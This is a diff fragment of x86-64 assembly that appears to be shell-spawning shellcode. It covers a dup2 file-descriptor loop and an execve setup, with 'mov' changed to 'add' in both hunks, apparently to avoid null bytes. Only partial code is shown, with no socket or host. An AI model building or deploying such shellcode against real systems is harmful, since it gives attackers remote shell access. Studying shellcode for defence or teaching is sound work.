@@ -111,7 +111,7 @@ real_start:
 
     loopin:
         xor rax, rax    ; zero out rax
-        mov rax, 33     ; setting rax to sys_dup2
+        add rax, 33     ; setting rax to sys_dup2
         mov rsi, r9     ; move fileid to duplicate
         syscall         ; call dup2
         inc r9          ; increase r9 by 0x01
@@ -169,7 +169,7 @@ real_start:
     ; rdx : const char *const envp[]
 
     xor rax, rax        ; zeroing out rax
-    mov rax, 59         ; setting rax to sys_execve
+    add rax, 59         ; setting rax to sys_execve
 
     xor r9, r9          ; zeroing out r9
     push r9             ; pushing null to stack
